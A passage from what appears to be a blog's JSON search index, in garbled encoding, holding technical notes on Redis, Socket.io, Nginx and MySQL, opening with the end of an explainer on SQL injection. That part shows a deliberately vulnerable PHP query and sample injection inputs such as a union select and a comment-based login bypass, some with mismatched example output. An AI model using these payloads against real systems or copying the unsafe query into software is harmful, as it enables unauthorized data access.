&#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;è¿æ¥æ•°æ®åº“mysqli_select_db($conn, $db_name) or die (&quot;æ— æ³•è¿æ¥åˆ°æ•°æ®åº“: &quot;.$db_name);mysqli_query($conn, &#39;set names utf-8&#39;);&#x2F;&#x2F; è·å–å‚æ•°if(isset($_GET[&#39;id&#39;]))&#123; $id&#x3D;$_GET[&#39;id&#39;];&#125;&#x2F;&#x2F; æ‹¼æ¥SQLè¯­å¥$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;echo &#39;æŸ¥è¯¢SQL è¯­å¥:&#39;.$sql;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;æ‰§è¡Œ$result&#x3D;mysqli_query($conn, $sql);$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);if($row) &#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;]; echo &#39;&lt;hr&gt;&#39;; echo &#39;Your Password:&#39;.$row[&#39;password&#39;];&#125;?&gt; è°ƒç”¨åœ°å€æ˜¯http://127.0.0.1/sqli.php?id=1ï¼Œä½¿ç”¨GETä¼ å…¥å‚æ•°idï¼Œè¾“å‡ºçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39; æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¼šè¿”å›id = 1 çš„å­¦ç”Ÿä¿¡æ¯ã€‚ 1. æ•°å­—æ³¨å…¥å¦‚æœåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ï¼šhttp://127.0.0./sqli.php?id=1&#39; union select 1,2--+ä¼šæ€æ ·å‘¢ï¼Ÿè¾“å‡ºçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1 è¿™ä¼šå¯¼è‡´æ‰€æœ‰çš„å­¦ç”Ÿä¿¡æ¯éƒ½è¢«è¾“å‡ºäº†ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºid = -1æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ¡ä»¶ï¼Œè€Œ1 = 1å´æ˜¯ä¸€ä¸ªæ°¸è¿œå­˜åœ¨çš„æ¡ä»¶ï¼Œè¿™å°±ç›¸å½“äºæ²¡æœ‰åŠ  Where æ¡ä»¶ã€‚ 2. å­—ç¬¦ä¸²æ³¨å…¥ç°åœ¨æœ‰è¿™æ ·ä¸€ç§åœºæ™¯ï¼šhttp://127.0.0./login.phpæ¨¡æ‹Ÿç”¨æˆ·ç™»å½•ã€‚å‡è®¾æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯Booã€122410ï¼Œé‚£ä¹ˆåœ¨æ­£å¸¸çš„ç™»å½•æƒ…å†µä¸‹æ‰€æ‰§è¡Œçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39; ç”±äºç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥SQL æ³¨å…¥ä¼šæŠŠå‚æ•°æºå¸¦çš„æ•°æ®å˜æˆMysqlä¸­çš„æ³¨é‡Šã€‚Mysql ä¸­çš„æ³¨é‡Šæœ‰ä¸¤ç§ã€‚ 1. #å‡è®¾POST ä¼ é€’çš„å‚æ•°åˆ†åˆ«æ˜¯ï¼šusername = Boo&#39;#ã€password = xxxxxxï¼Œé‚£ä¹ˆäº§ç”Ÿçš„SQL è¯­å¥åˆ™æ˜¯ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39; å› ä¸º#å· åçš„æ‰€æœ‰å­—ç¬¦ä¸²éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šæ¥å¤„ç†ï¼Œæ‰€ä»¥ä¸Šé¢çš„SQL è¯­å¥ç­‰ä»·äºï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 2. --å‡è®¾POSTè¯·æ±‚ä¼ é€’çš„å‚æ•°åˆ†åˆ«æ˜¯ï¼šusername = Boo&#39;--ã€password = xxxxxxï¼Œé‚£ä¹ˆäº§ç”Ÿçš„SQL è¯­å¥åˆ™æ˜¯ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39; å› ä¸º--å· åé¢çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šå¤„ç†ï¼Œæ‰€ä»¥ä¸Šé¢çš„SQL è¯­å¥ç­‰ä»·äºï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; æ— è®ºæ˜¯ä¸Šé¢çš„å“ªä¸€ç§æƒ…å†µï¼Œæ”»å‡»è€…éƒ½èƒ½åœ¨ä¸çŸ¥é“å…·ä½“å¯†ç çš„æƒ…å†µä¸‹è€ŒæˆåŠŸç™»å½•ã€‚ è¿™å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªç®€å•çš„SQLæ³¨å…¥äº§ç”Ÿçš„å®Œæ•´è¿‡ç¨‹äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰çš„ä»‹ç»äº†ä¸‹åŸç†ï¼Œè€Œå®é™…åœºæ™¯ä¸­çš„SQL æ³¨å…¥å½“ç„¶è¿œè¿œä¸æ­¢è¿™ä¸¤ç§ã€‚ å‚è€ƒé“¾æ¥SQL æ³¨å…¥å¸¸è§æ–¹å¼ä»¥åŠæ£€æµ‹æ–¹æ³•","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Redis å¸¸è§äº‹ä»¶æ•´ç†","slug":"redis-common-events-collation","date":"2020-07-21T15:41:45.000Z","updated":"2020-07-21T15:42:45.608Z","comments":true,"path":"redis-common-events-collation/","link":"","permalink":"https://www.0x2beace.com/redis-common-events-collation/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† Redis çš„å¸¸ç”¨äº‹ä»¶ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† Redis çš„å¸¸ç”¨äº‹ä»¶ã€‚ å®¢æˆ·ç«¯äº‹ä»¶å®¢æˆ·ç«¯ä¼šå‘å‡ºä¸€äº›äº‹ä»¶çš„çŠ¶æ€è¿æ¥åˆ°Redis æœåŠ¡å™¨ã€‚ ReadyErrorå®¢æˆ·ç«¯è¿æ¥Redis æ—¶ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¼šè§¦å‘Error äº‹ä»¶ã€‚ Connectå®¢æˆ·ç«¯è¿æ¥è‡³Redis æ—¶ï¼Œä¼šè§¦å‘è¿æ¥äº‹ä»¶ã€‚ è®¢é˜…è€…äº‹ä»¶Messageå°†æ¥æ”¶åˆ°æ¥è‡ªè®¢é˜…é¢‘é“çš„æ¶ˆæ¯ï¼Œ 123client.on(&quot;message&quot;, function (channel, message) &#123; ...&#125;) Subscribeç›‘å¬è®¢é˜…äº‹ä»¶ï¼Œè¿”å›è®¢é˜…é¢‘é“çš„è®¢é˜…æ•°é‡ã€‚ 123client.on(&quot;subscribe&quot;, function (channel, count) &#123; ...&#125;) å‘å¸ƒ/è®¢é˜…Publishå°†ä¿¡æ¯ message å‘é€åˆ°æŒ‡å®šçš„é¢‘é“ channel ã€‚ è¿”å›å€¼ï¼šæ¥æ”¶åˆ°ä¿¡æ¯ message çš„è®¢é˜…è€…æ•°é‡ã€‚ 1PUBLISH channel message SUBSCRIBEè®¢é˜…ç»™å®šé¢‘é“çš„ä¿¡æ¯ã€‚ è¿”å›å€¼ï¼šæ¥æ”¶åˆ°çš„ä¿¡æ¯ã€‚ 1SUBSCRIBE channel [channel ...] å‚è€ƒé“¾æ¥ Rediså‘½ä»¤å‚è€ƒç®€ä½“ä¸­æ–‡ç‰ˆ A high performance Node.js Redis client","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Socket.io å¿«é€Ÿä¸Šæ‰‹","slug":"socket-io-quick-start","date":"2020-07-20T05:02:05.000Z","updated":"2020-07-20T05:04:22.840Z","comments":true,"path":"socket-io-quick-start/","link":"","permalink":"https://www.0x2beace.com/socket-io-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨socket.io å’Œ redis å®Œæˆäº†ä¸€äº›å°åŠŸèƒ½ï¼Œè§‰å¾—å¾ˆå®ç”¨ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹socket.ioç›¸å…³çš„çŸ¥è¯†ã€‚","text":"æœ€è¿‘ä½¿ç”¨socket.io å’Œ redis å®Œæˆäº†ä¸€äº›å°åŠŸèƒ½ï¼Œè§‰å¾—å¾ˆå®ç”¨ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹socket.ioç›¸å…³çš„çŸ¥è¯†ã€‚ socket.io æ˜¯ä»€ä¹ˆå®ƒæ˜¯ä¸€ä¸ªæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹é€šè®¯çš„å·¥å…·ã€‚ æœåŠ¡ç«¯åˆ›å»ºå¥½æœåŠ¡ä¹‹åï¼Œå®¢æˆ·ç«¯é€šè¿‡ä¸»æœºä¸ä¹‹å»ºç«‹è¿æ¥ã€‚ç„¶åå°±å¯ä»¥è¿›è¡Œé€šè®¯äº†ã€‚ æƒ³è¦ä½¿ç”¨å¥½socket.ioï¼Œä¸€å®šè¦ç†è§£é€šè®¯çš„æ¦‚å¿µã€‚é€šè®¯ä¸€å®šæ˜¯åŒå‘çš„ï¼Œå¦‚æœå®¢æˆ·ç«¯èƒ½å¤Ÿæ”¶åˆ°æ¶ˆæ¯ï¼Œé‚£ä¹ˆåœ¨æŸä¸ªåœ°æ–¹å°±ä¸€å®šå­˜åœ¨æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯æ¨é€æ¶ˆæ¯ã€‚ å¿«é€Ÿä¸Šæ‰‹è¦å¼€å§‹ä½¿ç”¨socket.ioè¿›è¡Œå¼€å‘ï¼Œéœ€è¦å…ˆå®‰è£…Nodeå’Œnpmã€‚ åˆ›å»ºä¸€ä¸ªåä¸ºapp.jsçš„æ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹ä»£ç ã€‚ 12345678910111213141516var app &#x3D; require(&#39;express&#39;)();var http &#x3D; require(&#39;http&#39;).Server(app);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªé™„åŠ åˆ°httpæœåŠ¡å™¨çš„æ–°socket.ioå®ä¾‹var io &#x3D; require(&#39;socket.io&#39;)(http);app.get(&#39;&#x2F;&#39;, function(req, res)&#123; res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);&#125;);io.on(&#39;connection&#39;, function(socket)&#123; console.log(&#39;a user connected&#39;);&#125;);http.listen(3000, function()&#123; console.log(&#39;listening on *:3000&#39;);&#125;); è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªæœ€ç®€å•çš„socketæœåŠ¡ç«¯ã€‚ åˆ›å»ºindex.html æ–‡ä»¶æ¥ä½œä¸ºå®¢æˆ·ç«¯æä¾›æœåŠ¡ã€‚ 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯åŠ¨æœåŠ¡ 1node app.js åˆ›å»ºçš„æœåŠ¡è¿è¡Œåœ¨æœ¬åœ°çš„ 3000 ç«¯å£ä¸Šï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥http://localhost:3000è¿›è¡Œè®¿é—®ã€‚ ä½¿ç”¨äº‹ä»¶socket.io çš„æ ¸å¿ƒç†å¿µå°±æ˜¯å…è®¸å‘é€ã€æ¥æ”¶ä»»æ„äº‹ä»¶å’Œä»»æ„æ•°æ®ã€‚ä»»æ„èƒ½è¢«ç¼–ç ä¸º JSON çš„å¯¹è±¡éƒ½å¯ä»¥ç”¨äºä¼ è¾“ã€‚äºŒè¿›åˆ¶æ•°æ® ä¹Ÿæ˜¯æ”¯æŒçš„ã€‚ åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡ç«¯çš„socket.ioå¯¹è±¡ï¼Œå¦‚æœæƒ³è¦èƒ½æ­£å¸¸é€šè®¯ï¼Œè¿˜éœ€è¦åœ¨å®¢æˆ·ç«¯åŒæ ·ä¹Ÿåˆ›å»ºä¸€ä¸ªsocket.ioå¯¹è±¡ã€‚è¿™ä¸ªè„šæœ¬ç”±æœåŠ¡ç«¯çš„/socket.io/socket.io.js æä¾›ã€‚ 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; åœ¨å®¢æˆ·ç«¯ä¸­å»ºç«‹ socket.io è¿æ¥ã€‚ åœ¨æœåŠ¡ç«¯ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12345678910111213 ...&#x2F;&#x2F; åªæœ‰æœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶io.on(&#39;connection&#39;, function(socket) &#123; console.log(&#39;A user connected&#39;); &#x2F;&#x2F; åªæœ‰æœ‰å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ socket.on(&#39;disconnect&#39;, function () &#123; console.log(&#39;A user disconnected&#39;); &#125;);&#125;); ... ç°åœ¨å†æ¬¡è®¿é—®http://localhost:3000ï¼Œä¸ä»…å¯ä»¥åœ¨æµè§ˆå™¨ä¸­çœ‹è§hello worldï¼Œå¦‚æœåˆ·æ–°æµè§ˆå™¨ï¼Œè¿˜èƒ½åœ¨æ§åˆ¶å°ä¸­çœ‹è§ä»¥ä¸‹å†…å®¹ï¼š 123A user connectedA user disconnectedA user connected åœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†socket.ioçš„connectionå’Œdisconnectäº‹ä»¶ï¼Œsocket.ioè¿˜æœ‰å¾ˆå¤šå…¶ä¸­äº‹ä»¶ã€‚ äº‹ä»¶å¤„ç†åœ¨æœåŠ¡ç«¯ä¸­æœ‰ä»¥ä¸‹æ˜¯ä¿ç•™å­—ï¼š Connect Message Disconnect Reconnect Ping Join and Leave åœ¨å®¢æˆ·ç«¯ä¸­ä»¥ä¸‹æ˜¯ä¿ç•™å­—ï¼š Connect Connect_error Connect_timeout Reconnect, etc å¸¸ç”¨APIå®¢æˆ·ç«¯ æä¾›çš„ä¸€äº›ç”¨äºå¤„ç†é”™è¯¯/å¼‚å¸¸çš„APIã€‚ 1234567891011121314151617Connect âˆ’ When the client successfully connects.Connecting âˆ’ When the client is in the process of connecting.Disconnect âˆ’ When the client is disconnected.Connect_failed âˆ’ When the connection to the server fails.Error âˆ’ An error event is sent from the server.Message âˆ’ When the server sends a message using the send function.Reconnect âˆ’ When reconnection to the server is successful.Reconnecting âˆ’ When the client is in the process of connecting.Reconnect_failed âˆ’ When the reconnection attempt fails. å¹¿æ’­å¹¿æ’­æ„å‘³ç€å‘æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚ è¦å‘æ‰€æœ‰å®¢æˆ·ç«¯å¹¿æ’­äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨io.sockets.emitæ–¹æ³•ã€‚ 12345678910111213 ...var clients &#x3D; 0;io.on(&#39;connection&#39;, function(socket) &#123; clients++; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); socket.on(&#39;disconnect&#39;, function () &#123; clients--; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); &#125;);&#125;); ... å¹¿æ’­åœ¨socket.ioä¸­åº”ç”¨çš„éå¸¸å¤šï¼Œæœ‰å¹¿æ’­å°±æ„å‘³ç€æœ‰æ¥æ”¶ã€‚éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸­å¤„ç†å¹¿æ’­äº‹ä»¶ï¼š 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); socket.on(&#39;broadcast&#39;,function(data) &#123; document.body.innerHTML &#x3D; &#39;&#39;; document.write(data.description); &#125;); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯ä»¥å°è¯•æ‰“å¼€å¤šä¸ªæµè§ˆå™¨ï¼Œè¾“å…¥http://localhost:3000ï¼Œå¯èƒ½ä¼šå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š å‚è€ƒé“¾æ¥ Socket.io Tutorial","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"}],"tags":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"}]},{"title":"Nginx å¸¸è§é…ç½®","slug":"nginx-common-configuration","date":"2020-07-19T10:22:26.000Z","updated":"2020-07-19T10:24:25.144Z","comments":true,"path":"nginx-common-configuration/","link":"","permalink":"https://www.0x2beace.com/nginx-common-configuration/","excerpt":"æœ€è¿‘æ¥è§¦Nginx é…ç½®æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢å›é¡¾ã€‚","text":"æœ€è¿‘æ¥è§¦Nginx é…ç½®æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢å›é¡¾ã€‚ å¤šç«™ç‚¹é…ç½®å¦‚æœä¸€å°æœåŠ¡å™¨ï¼Œéœ€è¦é…ç½®å¤šå¥—ç«™ç‚¹ï¼Œæ¨èä½¿ç”¨ IP + ç«¯å£é…ç½®ç«™ç‚¹ï¼Œç„¶åä½¿ç”¨åå‘ä»£ç†æŒ‡å‘ç«¯å£ã€‚ ç«™ç‚¹é…ç½® 12345678910server &#123; listen 40001; location ~ \\.php &#123; ... &#125; location &#x2F; &#123; ... &#125;&#125; å¤šç«™ç‚¹é…ç½® 123456789101112131415161718192021&#x2F;&#x2F; ç«™ç‚¹1 server &#123; server_name yoursite.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125;&#x2F;&#x2F; ç«™ç‚¹2server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; åå‘ä»£ç†åå‘ä»£ç†å…¶å®å·²ç»åœ¨ä¸Šé¢çš„é…ç½®ä¸­å‡ºç°è¿‡äº†ï¼Œå¤šç«™ç‚¹é…ç½®çš„åŸç†å°±æ˜¯åˆ©ç”¨åå‘ä»£ç†ã€‚ 123456789server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; SSL é…ç½®ç”³è¯·å¥½è¯ä¹¦ä¹‹åï¼Œå°†å…¶æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åç¼–è¾‘Nginx é…ç½®ï¼š 12345678910111213server &#123; server_name yoursite.com; listen 443 ssl; ssl on; ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem; &#x2F;&#x2F; è¯ä¹¦æ‰€åœ¨è·¯å¾„ ssl_certificate_key ssl_0123cp_net&#x2F;private.key; &#x2F;&#x2F; è¯ä¹¦å¯¹åº”çš„ç§é’¥æ‰€åœ¨è·¯å¾„ location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; httpé‡å®šå‘é…ç½®å¥½ httpsä¹‹åï¼Œè¿˜éœ€è¦åšä¸€ä»¶äº‹ï¼Œæ‰èƒ½ä¿è¯ httpsèƒ½å¤Ÿæ­£å¸¸è®¿é—®ã€‚ å› ä¸ºè®¿é—®ä»»ä½•ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯httpåè®®ï¼Œæ‰€ä»¥éœ€è¦åœ¨Web Serverä¸­é…ç½®http è‡ªåŠ¨è·³è½¬ httpsã€‚ 123456server &#123; server_name yoursite.com; listen 80; rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Mac å¼€å¯ Mysql æ—¥å¿—è®°å½•","slug":"mac-open-mysql-logging","date":"2020-07-19T09:24:43.000Z","updated":"2020-07-20T05:06:44.373Z","comments":true,"path":"mac-open-mysql-logging/","link":"","permalink":"https://www.0x2beace.com/mac-open-mysql-logging/","excerpt":"æœ‰æ—¶å€™å¯èƒ½ä¼šæƒ³åœ¨æœ¬åœ°å¼€å¯Mysql çš„æ—¥å¿—è®°å½•ï¼Œçœ‹çœ‹å…·ä½“éƒ½æ‰§è¡Œäº†å“ªäº›SQLï¼Œå…¶å®éå¸¸ç®€å•ã€‚","text":"æœ‰æ—¶å€™å¯èƒ½ä¼šæƒ³åœ¨æœ¬åœ°å¼€å¯Mysql çš„æ—¥å¿—è®°å½•ï¼Œçœ‹çœ‹å…·ä½“éƒ½æ‰§è¡Œäº†å“ªäº›SQLï¼Œå…¶å®éå¸¸ç®€å•ã€‚ è¿›å…¥Mysql å‘½ä»¤è¡Œ 1mysql -hlocalhost -uroot -p å…¨å±€å¼€å¯æ™®é€šæ—¥å¿—è®°å½• 1set global general_log&#x3D;on; æŸ¥çœ‹Mysql æ—¥å¿—æ–‡ä»¶æ‰€åœ¨ç›®å½• 1show variables like &#39;general_log_file&#39;; å®æ—¶æŸ¥çœ‹æ—¥å¿—è®°å½• 1tail -f &#x2F;your_mysql_log_file_path","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql è¡Œé”åŸå› åˆ†æ","slug":"analysis-of-the-causes-of-mysql-row-lock","date":"2020-07-19T09:03:04.000Z","updated":"2020-07-19T09:11:47.872Z","comments":true,"path":"analysis-of-the-causes-of-mysql-row-lock/","link":"","permalink":"https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/","excerpt":"è¿™ç¯‡æ–‡ç« æ¥æµ…è°ˆä¸€ä¸‹ä»€ä¹ˆæ˜¯Mysql è¡Œé”ï¼Œä»¥åŠäº§ç”Ÿè¡Œé”çš„åŸå› ã€‚","text":"è¿™ç¯‡æ–‡ç« æ¥æµ…è°ˆä¸€ä¸‹ä»€ä¹ˆæ˜¯Mysql è¡Œé”ï¼Œä»¥åŠäº§ç”Ÿè¡Œé”çš„åŸå› ã€‚ é”çš„åˆ†ç±»MySQLæœ‰ä¸‰ç§é”çš„çº§åˆ«ï¼šé¡µçº§ã€è¡¨çº§ã€è¡Œçº§ã€‚ è¡¨çº§é”ï¼šå¼€é”€å°ï¼ŒåŠ é”å¿«ï¼›ä¸ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦å¤§ï¼Œå‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€é«˜,å¹¶å‘åº¦æœ€ä½ã€‚ è¡Œçº§é”ï¼šå¼€é”€å¤§ï¼ŒåŠ é”æ…¢ï¼›ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦æœ€å°ï¼Œå‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€ä½,å¹¶å‘åº¦ä¹Ÿæœ€é«˜ã€‚ é¡µé¢é”ï¼šå¼€é”€å’ŒåŠ é”æ—¶é—´ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´ï¼›ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´ï¼Œå¹¶å‘åº¦ä¸€èˆ¬ å› ä¸ºè¿™ç¯‡ç¬”è®°åªä»‹ç»Mysql è¡Œé”ï¼Œæ‰€ä»¥è¿™é‡Œä¸å¯¹å…¶ä»–ç±»å‹çš„é”åšä»‹ç»äº†ã€‚ è¡Œé”InnoDBå®ç°äº†ä¸¤ç§ç±»å‹çš„è¡Œé”: å…±äº«é”ã€Sé”ã€‘åˆç§°è¯»é”ï¼Œè‹¥äº‹åŠ¡Tå¯¹æ•°æ®å¯¹è±¡AåŠ ä¸ŠSé”ï¼Œåˆ™äº‹åŠ¡Tå¯ä»¥è¯»Aä½†ä¸èƒ½ä¿®æ”¹Aï¼Œå…¶ä»–äº‹åŠ¡åªèƒ½å†å¯¹AåŠ Sé”ï¼Œè€Œä¸èƒ½åŠ Xé”ï¼Œç›´åˆ°Té‡Šæ”¾Aä¸Šçš„Sé”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡å¯ä»¥è¯»Aï¼Œä½†åœ¨Té‡Šæ”¾Aä¸Šçš„Sé”ä¹‹å‰ä¸èƒ½å¯¹Aåšä»»ä½•ä¿®æ”¹ã€‚ æ’ä»–é”ã€Xé”ã€‘åˆç§°å†™é”ã€‚è‹¥äº‹åŠ¡Tå¯¹æ•°æ®å¯¹è±¡AåŠ ä¸ŠXé”ï¼Œäº‹åŠ¡Tå¯ä»¥è¯»Aä¹Ÿå¯ä»¥ä¿®æ”¹Aï¼Œå…¶ä»–äº‹åŠ¡ä¸èƒ½å†å¯¹AåŠ ä»»ä½•é”ï¼Œç›´åˆ°Té‡Šæ”¾Aä¸Šçš„é”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡åœ¨Té‡Šæ”¾Aä¸Šçš„é”ä¹‹å‰ä¸èƒ½å†è¯»å–å’Œä¿®æ”¹Aã€‚ æ‰€è°“Xé”,æ˜¯äº‹åŠ¡Tå¯¹æ•°æ®AåŠ ä¸ŠXé”æ—¶,åªå…è®¸äº‹åŠ¡Tè¯»å–å’Œä¿®æ”¹æ•°æ®A; æ‰€è°“Sé”,æ˜¯äº‹åŠ¡Tå¯¹æ•°æ®AåŠ ä¸ŠSé”æ—¶,å…¶ä»–äº‹åŠ¡åªèƒ½å†å¯¹æ•°æ®AåŠ Sé”,è€Œä¸èƒ½åŠ Xé”,ç›´åˆ°Té‡Šæ”¾Aä¸Šçš„Sé” åœºæ™¯é‡ç° é¦–å…ˆåˆ›å»ºä¸€ä¸ª InnoDBç±»å‹çš„æ•°æ®è¡¨ï¼ŒSQL å¦‚ä¸‹ï¼š 1234CREATE TABLE &#96;gap&#96; ( &#96;id&#96; int(11) DEFAULT NULL, KEY &#96;ind_gap_id&#96; (&#96;id&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; åˆ›å»ºä¼šè¯1ï¼Œå¼€å¯äº‹åŠ¡Aå¹¶æ‰§è¡Œupdate è¯­å¥ 12start transaction;update gap set id &#x3D; 30 where id &#x3D; 33; åˆ›å»ºä¼šè¯2ï¼Œå¼€å¯äº‹åŠ¡Bå¹¶æ‰§è¡Œå¦ä¸€ä¸ªupdate è¯­å¥ 12start transaction;update gap set id &#x3D; 22 where id &#x3D; 20; åœ¨ä¼šè¯2ä¸­ æ’å…¥20 &gt; id &lt; 39èŒƒå›´å¤–çš„å€¼æ—¶ å¯ä»¥æ‰§è¡ŒæˆåŠŸ,è€Œå½“è¦æ’å…¥ [20,39)èŒƒå›´å†…çš„å€¼æ—¶ ä¼šé‡åˆ°gap lock ã€‚ ç”¨ä¼šè¯1 æŸ¥çœ‹å½“å‰æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡1SELECT * FROM information_schema.INNODB_TRX; 